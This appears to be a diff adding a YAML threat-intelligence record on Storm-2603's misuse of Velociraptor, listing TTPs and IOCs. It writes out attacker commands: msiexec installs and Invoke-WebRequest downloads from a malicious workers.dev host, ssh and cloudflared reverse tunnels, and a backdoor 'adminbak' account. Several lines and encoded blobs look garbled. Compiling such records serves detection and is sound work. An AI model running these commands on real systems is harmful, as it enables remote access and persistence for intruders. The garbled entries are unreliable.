@@ -1,0 +1,92 @@
+description: Threat actors exploited vulnerabilities in SharePoint and WSUS to install
+  Velociraptor for C2 communications, using encoded PowerShell commands and legitimate
+  tools like Visual Studio Code.
+attribution: Storm-2603
+malware_families:
+- Velociraptor
+- Warlock
+- Trojan:MSOffice/Seheq.Gen
+TTPs:
+  processes:
+  - msiexec.exe
+  - powershell.exe
+  - cloudflared.exe
+  - code.exe
+  - net.exe
+  - net user
+  - Velociraptor.exe
+  commandline:
+  - msiexec /q /i https://royal-boat-bf05.qgtxtebl.workers.dev/ssh.msi
+  - msiexec /q /i https://royal-boat-bf05.qgtxtebl.workers.dev/v3.msi
+  - '"C:\\Program Files (x86)\\cloudflared\\cloudflared.exe" tunnel run --token [REDACTED]'
+  - Start-Process powershell "ssh -R 80:localhost:35891 -o StrictHostKeyChecking=no
+    nokey@localhost.run > c:\\users\\public\\iv.log"
+  - netstat -ant | findstr "35891"
+  - cat c:\\users\\public\\iv.log
+  - net user adminbak abcd1234..## /add
+  - msiexec /q /i https://royal-boat-bf05.qgtxtebl.workers.dev/v3.msi&Expedited
+  - C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ExecutionPolicy
+    Unrestricted -encodedCommandSQBUAHYAbwBrAGUALQBXAGUAYgBSAGUACQB1AGUACW4ACAALQBVAHIAaQAgACIAaABOAHQACABZADOALWAVAHIAbQB5AGEAbAAL
+  - C:\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -ExecutionPolicy
+    Unrestricted -encodedCommandQWABAFWAUABYAGBAZWBYAGEADQBEAGEAdABhAFWATQBPAGMACEBVAHMAbQBMAHQAXABJAGBAZABIAC4AZQBAAGUAIABOAHUAbEBTAGUAADAAGACOALQBhAGMAYWBIAHAAJAAtAHMAZ
+    7QByAHYAZQBYACOADABPAGMAZQBUAHMAZQAtAHQAZQBYAGOACWAGAHMAZQBYAHYA2QB)AGUAIABpAG4ACWBOAGEADABSACAAPEAZAEMAAOgBCAFAACBVAGCACEBhAGOARABRAHQAYQBCAEOAaQBjAHIADWBZAGBAZgBOAFWAaQAXAC4ADABVAGCA==
+  powershell:
+  - Invoke-WebRequest -Uri "https://royal-boat-bf05.qgtxtebl.workers.dev/code.txt"
+    -OutFile "C:\\ProgramData\\Microsoft\\AppV\\code.exe"
+  - C:\\ProgramData\\Microsoft\\AppV\\code.exe tunnel --accept-server-license-terms
+    service install > C:\\ProgramData\\Microsoft\\AppV\\i1.log
+  - Start-Process powershell "ssh -R 80:localhost:35891 -o StrictHostKeyChecking=no
+    nokey@localhost.run > c:\\users\\public\\iv.log"
+  - netstat -ant | findstr "35891"
+  - cat c:\\users\\public\\iv.log
+  - net user adminbak abcd1234..## /add
+  - Write-WebBeRue in -Uri "https://royal-boat-bf05.qgtxtebl.workers.dev/v3.msi&Expedited"
+  - Invoke-WebRequest -Uri "https://royal-boat-bf05.qgtxtebl.workers.dev/v3.msi&Expedited"
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - w3wp.exe -> https://royal-boat-bf05.qgtxtebl.workers.dev/ssh.msi
+  - w3wp.exe -> https://royal-boat-bf05.qgtxtebl.workers.dev/v3.msi
+  - '"C:\\Program Files (x86)\\cloudflared\\cloudflared.exe" tunnel run --token [REDACTED]'
+  file_activity:
+  - C:\\ProgramData\\Microsoft\\AppV\\code.exe
+  - C:\\ProgramData\\Microsoft\\AppV\\i1.log
+  - c:\\users\\public\\iv.log
+  - C:\\Windodebug starting as new singleton
+  persistence:
+  - Velociraptor configured as a Windows service
+  - Cloudflare tunnel installed and run
+  - SecurityCheck installed as a service
+  - 'Service (Own Process) - Velociraptor ServiceBinary Path: \"C:\\Program Files\\Velociraptor\\Velociraptor.exe\"
+    --config \"C:\\Program Files\\Velociraptor\\/client.config.yaml\" service run'
+  process_relations:
+  - w3wp.exe -> msiexec.exe
+IOCs:
+  hashes:
+  - c70fafe5f9a3e5a9ee7de584dd024cb552443659f06348398d3873aa88fd6682
+  - 040d7ee5b7bb0b978220be326804fa827f6284c8478a27af88c616fcacfeb423
+  ip_addresses:
+  - 38.54.16[.]179
+  - 91.236.230[.]76
+  - 91.236.230.76
+  domains:
+  - royal-boat-bf05.qgtxtebl.workers.dev
+  - update.githubtestbak.workers.dev
+  - chat.hcqhajfv.workers.dev
+  urls:
+  - https://royal-boat-bf05.qgtxtebl.workers.dev/ssh.msi
+  - https://royal-boat-bf05.qgtxtebl.workers.dev/v3.msi
+  - https://royal-boat-bf05.qgtxtebl.workers.dev/code.txt
+  - https://royal-boat-bf05.qgtxtebl.workers.dev/v3.msi&Expedited
+  - https://api.github.com
+  - https://global.rel.tunnels.api.visualstudio.com/info
+  - https://use.rel.tunnels.api.visualstudio.com
+authors:
+- Ben Folland
+- Anna Pham
+- Michael Tigges
+- Anton Ovrutsky
+reference: https://www.huntress.com/blog/velociraptor-misuse-part-two-eye-of-the-storm
+date_of_publication: September 09, 2025
+file_creation_date: December 04, 2025
